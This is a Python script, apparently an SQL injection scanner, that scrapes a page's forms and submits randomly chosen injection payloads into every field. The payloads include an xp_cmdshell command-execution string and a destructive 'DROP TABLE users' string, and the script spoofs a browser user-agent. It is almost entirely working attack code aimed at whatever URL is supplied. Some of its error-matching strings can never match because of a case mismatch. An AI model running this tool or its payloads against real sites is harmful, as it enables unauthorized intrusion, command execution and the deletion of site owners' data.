import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import concurrent.futures
import random
import logging

# Configure logging for detailed scan results
logging.basicConfig(filename="sqli_scan_results.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Set a custom User-Agent header to mimic a real browser
USER_AGENT = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
session = requests.Session()
session.headers["User-Agent"] = USER_AGENT

# AI-enhanced payload generator (could be replaced with actual AI-based suggestions)
def generate_ai_payload():
    payloads = [
        "' OR '1'='1'; --", 
        "' UNION SELECT NULL, NULL, NULL; --", 
        "' OR 1=1 --", 
        "'; EXEC xp_cmdshell('whoami'); --", 
        "' AND 'a'='a'; --", 
        "'; DROP TABLE users; --"
    ]
    return random.choice(payloads)

def get_forms(url):
    """Extracts HTML forms from a given URL."""
    response = session.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    """Extracts details of a form including action, method, and inputs."""
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all(["input", "textarea", "select"]):  # Support more input types
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        details["inputs"].append({
            "type": input_type,
            "name": input_name,
            "value": input_value
        })
    return details

def vulnerable(response):
    """Checks if the response indicates potential SQL injection vulnerabilities."""
    errors = {
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your SQL syntax",
        "Warning: mysql_",
        "SQL syntax"
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def scan_form(form, url):
    """Tests a single form for SQL injection vulnerabilities."""
    form_info = form_details(form)
    action = form_info["action"]
    post_url = urljoin(url, action)  # Construct absolute URL for form action
    method = form_info["method"]

    print(f"[+] Testing form action: {post_url} (Method: {method})")
    # Try different payloads to detect SQL injection vulnerabilities
    for i in range(3):  # Test with multiple payloads for robustness
        payload = generate_ai_payload()
        data = {}
        for input_tag in form_info["inputs"]:
            if input_tag["type"] != "submit" and input_tag["name"]:  # Ensure name is present
                data[input_tag["name"]] = payload
        
        # Send the modified form data based on the form method
        if method == "post":
            response = session.post(post_url, data=data)
        else:
            response = session.get(post_url, params=data)

        if vulnerable(response):
            print(f"[!] SQL Injection vulnerability detected on {post_url} with payload: {payload}")
            logging.info(f"Vulnerable form found at {post_url} with payload: {payload}")
            break
        else:
            print(f"[-] No SQL Injection vulnerability detected on {post_url} with payload: {payload}")

def sql_injection_scan(url):
    """Scans a given URL for SQL injection vulnerabilities."""
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    # Use concurrent threads to speed up the scan
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for form in forms:
            futures.append(executor.submit(scan_form, form, url))
        
        for future in concurrent.futures.as_completed(futures):
            future.result()

if __name__ == "__main__":
    # URL to be checked for SQL injection vulnerabilities
    url_to_check = "https://example.com"  # Replace with the actual URL to check
    # Initiate SQL injection scan for the specified URL
    sql_injection_scan(url_to_check)
